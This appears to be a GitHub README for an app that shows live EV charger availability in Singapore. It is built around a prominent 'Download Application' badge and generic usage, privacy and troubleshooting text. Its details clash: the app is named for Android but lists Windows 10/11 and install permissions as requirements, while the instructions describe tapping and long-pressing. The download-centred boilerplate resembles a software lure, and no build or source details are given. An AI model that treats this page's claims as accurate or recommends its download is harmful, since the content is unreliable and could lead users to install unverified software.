# ⚡ sgevchargingapp_android - Find electric vehicle chargers in Singapore

[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/constancewritten870/sgevchargingapp_android)

This application helps electric vehicle drivers in Singapore locate charging stations. It pulls real-time availability data from the Land Transport Authority. You get accurate information about charger status across the island. The map interface shows you exactly where to find power for your car.

*   Windows 10 or Windows 11.
*   4GB of system memory.
*   An active internet connection.
*   A user account with permissions to install software.

## 🗺️ Using the map

The main screen shows a map of your current area. Icons represent charging points. Blue icons indicate chargers that are available. Red icons indicate chargers that are currently in use or offline. Tap any icon to see the station name, the charger type, and the current status. The app updates this data constantly to keep you informed. 

## 🔋 Finding chargers efficiently

You have several ways to locate stations. Use the search bar at the top to type in a street name or building. The map centers on that location. You can also drag the map manually to view other neighborhoods. The software filters results based on their real-time status. You save time by checking if a station has a free spot before you drive there.

## ⚙️ Settings and preferences

You can change how the app displays information. Open the menu by clicking the icon in the top left corner. Select Settings to view your options. You can toggle map layers between standard and satellite views. You can also adjust the refresh rate for data updates. Keep the default settings if you prefer the standard configuration for Singapore charging spots.

## 💡 Troubleshooting common issues

Most issues stem from connection problems or outdated data. Check your internet connection if the map fails to load. Close the application and reopen it to force a hard refresh of the station list. Ensure your firewall allows the application to access the internet. This software requires constant data transmission to show accurate LTA availability. 

## 🔐 Privacy and security

This application uses secure protocols to retrieve information from the LTA DataMall. It does not store your personal information. Your location data stays on your device. The app only uses your GPS coordinates to center the map on your current position. No data leaves your machine unless you initiate a search command.

## 📈 Improving the experience

Battery management matters when you drive an electric vehicle. Use this tool before you leave your home or office. Verify the status of the station closest to your destination. Having a backup plan serves you well if the first station experiences technical difficulties. The live data feed provides updates every few minutes to minimize your wait time at busy locations. 

## 🛠️ Advanced tips for power users

You can pin your favorite stations for quick access. Long-press on a station marker to save it to your list. Access your favorites from the sidebar menu at any time. This feature provides a quick status check during your daily commute. Use the clear button to remove stations you no longer use as frequently. The app remembers these preferences until you change them. 

## 📋 Understanding station data

The app categorizes chargers by speed and connector type. Slow chargers provide a full charge over several hours. Fast chargers reduce waiting periods significantly. Look at the details window for each marker to identify the charger speed. This helps you select a station that fits your timeframe. Always check the specific parking terms for each station to avoid unexpected fines or restrictions while you charge your vehicle.
